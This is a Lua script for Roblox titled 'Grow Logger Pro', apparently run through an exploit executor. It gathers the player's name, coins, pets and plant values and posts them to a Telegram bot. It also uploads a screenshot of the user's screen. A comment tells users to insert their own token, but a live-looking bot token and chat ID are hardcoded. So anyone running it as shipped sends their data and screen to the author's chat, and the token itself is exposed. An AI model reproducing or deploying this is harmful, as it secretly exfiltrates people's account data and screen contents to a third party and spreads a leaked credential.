-- ✅ Grow Logger Pro Edition for Roblox - Telegram Connected -- 👑 by @vadimkapipirka - Full Version with GUI, translations, pet & plant data -- You must replace TOKEN and CHAT_ID with your own

local Http = game:GetService("HttpService") local Players = game:GetService("Players") local Mouse = Players.LocalPlayer:GetMouse() local Player = Players.LocalPlayer local Workspace = game:GetService("Workspace")

local TOKEN = "8101289751:AAEk6wpg5UkUBY8S5dSRLcTI0M8TJIZssc4" local CHAT_ID = "5678878569"

-- Plant prices and mutations local basePrices = { Carrot=18, Strawberry=14, Blueberry=23, Tomato=27, OrangeTulip=767, Cucumber=37, Corn=56, Apple=45, Potato=40, Onion=20, Mushroom=70 }

local mutationMult = { Gold = 20, Rainbow = 50, Wet = 2, Windstruck = 2, Moonlit = 2, Chilled = 2, Twisted = 5, Frozen = 10, Aurora = 90, Shocked = 50, Celestial = 120, Zombified = 25, Disco = 125, Voidtouched = 135, Pollinated = 3, Burnt = 4, Molten = 35, Dawnbound = 150, Alienlike = 100, Sundried = 85 }

-- Pets info local petInfo = { Bunny = {type="Common", ability="1.5× к моркови"}, Dog = {type="Common", ability="Достаёт случайное семя"}, PolarBear = {type="Rare", ability="Chilled/Frozen мутация"}, Dragonfly = {type="Epic", ability="Gold мутация шанс"}, Turtle = {type="Common", ability="Boost к Blueberry"}, Cow = {type="Rare", ability="Больше урожая от Tomato"} }

-- Translations (EN to RU) local translate = { Carrot="Морковь", Strawberry="Клубника", Blueberry="Черника", Tomato="Томат", Onion="Лук", Potato="Картофель", Apple="Яблоко", OrangeTulip="Оранжевый Тюльпан", Mushroom="Гриб", Corn="Кукуруза" }

-- Telegram message send local function sendText(text) local url = "https://api.telegram.org/bot"..TOKEN.."/sendMessage" local data = { chat_id = CHAT_ID, text = text } local body = Http:JSONEncode(data) local headers = { ["Content-Type"] = "application/json" } if syn and syn.request then syn.request({Url=url, Method="POST", Headers=headers, Body=body}) elseif http_request then http_request({Url=url, Method="POST", Headers=headers, Body=body}) end end

-- Screenshot send local function sendScreenshot() if getscreenshot then local img = getscreenshot() local boundary = "----WebKitFormBoundary"..Http:GenerateGUID(false) local body = "--"..boundary.."\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n"..CHAT_ID.. "\r\n--"..boundary.."\r\nContent-Disposition: form-data; name="photo"; filename="screenshot.png"\r\nContent-Type: image/png\r\n\r\n"..img.."\r\n--"..boundary.."--" local headers = { ["Content-Type"] = "multipart/form-data; boundary="..boundary } if syn then syn.request({Url="https://api.telegram.org/bot"..TOKEN.."/sendPhoto", Method="POST", Headers=headers, Body=body}) end end end

-- Scan plants and build data local function collectInfo() local list = {"\uD83D\uDC64 Игрок: "..Player.Name} local ls = Player:FindFirstChild("leaderstats") local coins = ls and ls:FindFirstChild("Coins") and ls.Coins.Value or 0 local harvest = ls and ls:FindFirstChild("Harvest") and ls.Harvest.Value or 0 table.insert(list, "\uD83D\uDCB0 Coins: "..coins.." | Harvest: "..harvest)

-- Питомцы local pets = {} for _, pet in pairs(Player:FindFirstChild("Pets") and Player.Pets:GetChildren() or {}) do local info = petInfo[pet.Name] local str = info and (pet.Name.." ["..info.type.."] - "..info.ability) or pet.Name table.insert(pets, str) end table.insert(list, "\uD83D\uDC3E Pets:\n"..(#pets > 0 and table.concat(pets, "\n") or "Нет"))

-- Растения table.insert(list, "\uD83C\uDF3F Plants:") for _, obj in ipairs(Workspace:GetDescendants()) do if obj:IsA("Model") and obj:FindFirstChild("Owner") and obj.Owner.Value == Player then local name = obj.Name local lvl = obj:FindFirstChild("Level") and obj.Level.Value or "?" local mut = obj:FindFirstChild("Mutation") and obj.Mutation.Value or "None" local base = basePrices[name] or 0 local mul = mutationMult[mut] or 1 local price = base * mul local ru = translate[name] or name table.insert(list, string.format("%s Lv.%s | %s ×%dx = %d$", ru, lvl, mut, mul, price)) end end

return table.concat(list, "\n") end

-- Run once sendText("\u2728 Grow Logger запущен") sendText(collectInfo()) sendScreenshot()

